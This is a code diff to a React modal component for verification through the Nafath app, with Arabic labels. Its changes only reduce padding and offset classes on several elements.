@@ -83,10 +83,10 @@ export default function NafazModal({ isOpen, onClose, userId, phone }: ModalProp
 
       <div className="flex items-center justify-center min-h-screen px-4 py-8 sm:p-6">
         <div className="relative bg-white rounded-lg max-w-xl w-full mx-auto shadow-xl">
-          <div className="p-4 sm:p-8 text-center space-y-6">
+          <div className="p-1 sm:p-8 text-center space-y-6">
             <button
               onClick={onClose}
-              className="absolute top-4 left-4 text-gray-400 hover:text-gray-500 transition-colors"
+              className="absolute top-1 left-4 text-gray-400 hover:text-gray-500 transition-colors"
             >
               <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                 <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
@@ -95,7 +95,7 @@ export default function NafazModal({ isOpen, onClose, userId, phone }: ModalProp
 
             <h3 className="text-2xl sm:text-3xl font-bold text-[#3a9f8c] text-right">التحقق من خلال تطبيق نفاذ</h3>
 
-            <span className="bg-[#3a9f8c] flex justify-center p-4 text-white rounded-lg text-lg">تطبيق نفاذ</span>
+            <span className="bg-[#3a9f8c] flex justify-center p-1 text-white rounded-lg text-lg">تطبيق نفاذ</span>
 
             <div className="w-24 h-24 rounded-xl flex items-center justify-center mx-auto border-2 border-[#3a9f8c]">
               {loading ? (
@@ -136,7 +136,7 @@ export default function NafazModal({ isOpen, onClose, userId, phone }: ModalProp
 
             <button
               onClick={onClose}
-              className="mt-8 mx-auto bg-[#3a9f8c] text-white px-8 py-3 rounded-lg hover:bg-[#3a9f8c]/80 transition-colors"
+              className="mt-8 mx-auto bg-[#3a9f8c] text-white px-8 py-1 rounded-lg hover:bg-[#3a9f8c]/80 transition-colors"
             >
               إغلاق
             </button>
